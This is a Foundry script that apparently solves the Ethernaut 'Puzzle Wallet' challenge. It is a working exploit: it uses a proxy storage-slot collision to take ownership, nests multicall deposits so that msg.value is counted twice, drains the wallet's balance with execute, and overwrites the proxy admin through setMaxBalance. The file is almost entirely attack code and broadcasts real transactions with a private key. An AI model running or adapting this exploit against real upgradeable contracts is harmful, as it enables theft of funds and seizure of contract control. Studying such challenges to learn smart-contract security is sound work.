// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../src/PuzzleWallet.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PuzzleWalletSolution is Script {
    PuzzleWallet public puzzleWallet = PuzzleWallet(payable(0xc51a15C544B1965BE3c4eEA975AF0129f1d03Caf));
    PuzzleProxy public puzzleProxy = PuzzleProxy(payable(0xc51a15C544B1965BE3c4eEA975AF0129f1d03Caf));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes[] memory depositSelector = new bytes[](1);
        bytes[] memory nestedMulticall = new bytes[](2);

        depositSelector[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        nestedMulticall[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositSelector);

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before owner : ", puzzleWallet.owner());
        console.log("Before admin : ", puzzleProxy.admin());

        puzzleProxy.proposeNewAdmin(vm.envAddress("MY_ADDRESS"));
        puzzleWallet.addToWhitelist(vm.envAddress("MY_ADDRESS"));

        puzzleWallet.multicall{value: 0.001 ether}(nestedMulticall);
        puzzleWallet.execute(vm.envAddress("MY_ADDRESS"), 0.002 ether, "");

        puzzleWallet.setMaxBalance(uint256(uint160(vm.envAddress("MY_ADDRESS"))));

        console.log("After owner : ", puzzleWallet.owner());
        console.log("After admin : ", puzzleProxy.admin());

        vm.stopBroadcast();
    }
}